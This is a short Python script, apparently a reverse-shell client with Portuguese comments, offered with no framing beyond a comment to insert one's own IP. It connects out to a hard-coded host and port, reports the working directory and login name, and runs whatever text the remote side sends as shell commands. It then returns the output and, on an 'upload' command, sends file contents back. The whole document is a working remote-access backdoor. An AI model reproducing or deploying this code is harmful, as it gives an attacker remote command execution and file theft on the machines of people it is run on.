import socket
import os
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Coloque o IP Da sua máquina - insert tour computer's IP
host = '169.254.164.214'
port = 6666

s.connect((host, port))

while True:
    s.send(f'{os.getcwd()}:{os.getlogin()} : '.encode())
    data = s.recv(1024)


    if data.decode('utf-8')[:6] == 'upload':
        path = data.decode('utf-8')[7:]
        if os.path.exists(path):
            tamanho = os.path.getsize(path)
            arq = open(path, 'rb')
            for i in arq.readlines():
                s.send(i)
            s.send('END'.encode())
        else:
            s.send('Arquivo nao localizado'.encode())


    if data[:2].decode("utf-8", errors='replace') == 'cd':
        try:
            os.chdir(data[3:].decode("utf-8", errors='replace'))
            s.send('Ta OK'.encode())
        except FileNotFoundError:
            s.send(f'Diretório {data[3:]} não encontrado'.encode())
        except Exception as erro:
            s.send(f'{erro}'.encode())

    if len(data) > 0:
        try:
            cmd = subprocess.Popen(data.decode("utf-8", errors='replace'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            s.send(output_bytes)
        except Exception as erro:
            s.send(f'{erro}'.encode())
    elif data.decode() == 'quit':
        s.close()



